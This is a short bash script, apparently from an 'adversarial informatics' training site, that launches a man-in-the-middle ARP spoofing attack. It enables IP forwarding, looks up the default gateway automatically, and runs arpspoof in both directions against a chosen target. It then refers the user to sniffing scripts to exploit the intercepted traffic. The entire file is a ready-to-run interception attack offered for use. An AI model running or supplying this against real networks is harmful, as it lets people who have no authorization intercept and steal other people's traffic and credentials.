#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_----------------------------------------------+"
echo -e "|  Adversarial Informatics Combat MITM ARP Spoof   |"
echo -e "|               cygienesolutions.com               |"
echo -e "|  [Usage]: ./mitm_arpspoof_aic.sh <INF> <TARGET>  |"
echo -e "+-------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Successful execution will set up an ARP spoof between the provided"
    echo -e "target and the local network range's default gateway.  The gateway"
    echo -e "is automatically retrieved and configured."
    echo -e ""
    echo -e "[Usage]: ./mitm_arpspoof_aic.sh eth0 192.168.1.44"
    echo -e "${NC}"
    exit 1; fi

INTERFACE="$1"
TARGET="$2"
GATEWAY=$(ip route | grep default | awk '{print $3}')

#Configure IP Forward
echo -e "${GREEN}"
echo -e "Configuring IP Forwarding..."
sysctl -w net.ipv4.ip_forward=1

#ARP Spoof (Backgrounded)
echo -e "${GREEN}"
echo -e "Executing ARP Spoof between $TARGET and $GATEWAY..."
arpspoof -i $INTERFACE -t $TARGET $GATEWAY&

#Default GW Spoof (Backgrounded)
echo -e "${GREEN}"
echo -e "Executing ARP Spoof between $GATEWAY and $TARGET..."
arpspoof -i $INTERFACE -t $GATEWAY $TARGET&

echo -e "Refer to sniff scripts to exploit this MITM attack."
echo -e "{Ӧ Support Free Info Ӧ}"
echo -e "${NC}"


